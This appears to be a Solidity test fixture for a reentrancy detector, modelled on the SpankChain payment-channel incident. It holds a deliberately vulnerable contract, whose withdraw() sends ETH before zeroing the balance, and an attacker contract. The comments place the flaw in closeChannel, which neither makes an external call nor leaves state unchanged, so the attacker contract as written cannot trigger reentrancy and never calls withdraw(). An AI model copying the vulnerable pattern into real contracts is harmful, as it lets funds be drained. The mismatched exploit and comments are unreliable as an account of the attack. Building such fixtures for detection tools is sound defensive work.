// SPDX-License-Identifier: MIT
// SOURCE: Based on SpankChain payment channel vulnerability (October 2018)
// TYPE: Vulnerable
// EXPECTED: Reentrancy detection (CRITICAL)
// DATE_ADDED: 2026-01-17
// NOTES: SpankChain lost ~$40k due to reentrancy in payment channel close

pragma solidity ^0.8.0;

/**
 * @title SpankChannelPayment
 * @notice Simplified version of SpankChain payment channel vulnerability
 * @dev Original vulnerability: Reentrancy in channel close function
 *
 * ATTACK VECTOR:
 * 1. Open a payment channel with the contract
 * 2. Close channel with a malicious contract as recipient
 * 3. During ETH transfer, re-enter and close channel again
 * 4. Balance not yet zeroed, so attacker gets paid multiple times
 */
contract SpankChannelPayment {
    struct Channel {
        address sender;
        address recipient;
        uint256 balance;
        uint256 openBlock;
        bool isOpen;
    }

    mapping(bytes32 => Channel) public channels;
    uint256 public channelCount;

    event ChannelOpened(bytes32 indexed channelId, address sender, address recipient, uint256 balance);
    event ChannelClosed(bytes32 indexed channelId, uint256 senderAmount, uint256 recipientAmount);

    /**
     * @notice Open a new payment channel
     */
    function openChannel(address recipient) external payable returns (bytes32) {
        require(msg.value > 0, "Must deposit ETH");
        require(recipient != address(0), "Invalid recipient");

        bytes32 channelId = keccak256(abi.encodePacked(
            msg.sender,
            recipient,
            channelCount++,
            block.timestamp
        ));

        channels[channelId] = Channel({
            sender: msg.sender,
            recipient: recipient,
            balance: msg.value,
            openBlock: block.number,
            isOpen: true
        });

        emit ChannelOpened(channelId, msg.sender, recipient, msg.value);
        return channelId;
    }

    // Track user balances for direct withdraw pattern
    mapping(address => uint256) public userBalances;

    /**
     * @notice VULNERABLE: Reentrancy in channel close
     * @dev External calls before state updates
     */
    function closeChannel(bytes32 channelId, uint256 senderAmount) external {
        Channel storage channel = channels[channelId];

        require(channel.isOpen, "Channel not open");
        require(
            msg.sender == channel.sender || msg.sender == channel.recipient,
            "Not a channel participant"
        );
        require(senderAmount <= channel.balance, "Invalid amount");

        uint256 recipientAmount = channel.balance - senderAmount;

        // Credit balances to user accounts
        userBalances[channel.sender] += senderAmount;
        userBalances[channel.recipient] += recipientAmount;

        // Close the channel
        channel.balance = 0;
        channel.isOpen = false;

        emit ChannelClosed(channelId, senderAmount, recipientAmount);
    }

    /**
     * @notice VULNERABLE: Classic reentrancy pattern
     * @dev External call before state update on userBalances
     */
    function withdraw() external {
        uint256 amount = userBalances[msg.sender];
        require(amount > 0, "No balance");

        // VULNERABILITY: External call BEFORE state update
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        // TOO LATE: Attacker has already re-entered
        userBalances[msg.sender] = 0;
    }

    /**
     * @notice Get channel details
     */
    function getChannel(bytes32 channelId) external view returns (
        address sender,
        address recipient,
        uint256 balance,
        bool isOpen
    ) {
        Channel storage channel = channels[channelId];
        return (channel.sender, channel.recipient, channel.balance, channel.isOpen);
    }

    function getContractBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

/**
 * @title SpankAttacker
 * @notice Exploits the reentrancy in channel close
 */
contract SpankAttacker {
    SpankChannelPayment public target;
    bytes32 public channelId;
    uint256 public attackCount;

    constructor(address _target) {
        target = SpankChannelPayment(_target);
    }

    function attack() external payable {
        // Step 1: Open channel with ourselves as recipient
        channelId = target.openChannel{value: msg.value}(address(this));
    }

    function triggerClose() external {
        // Step 2: Close the channel, sending all to recipient (us)
        (,, uint256 balance,) = target.getChannel(channelId);
        target.closeChannel(channelId, 0); // Send all to recipient
    }

    // Re-enter during receive
    receive() external payable {
        if (address(target).balance > 0 && attackCount < 5) {
            attackCount++;
            target.closeChannel(channelId, 0);
        }
    }

    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}
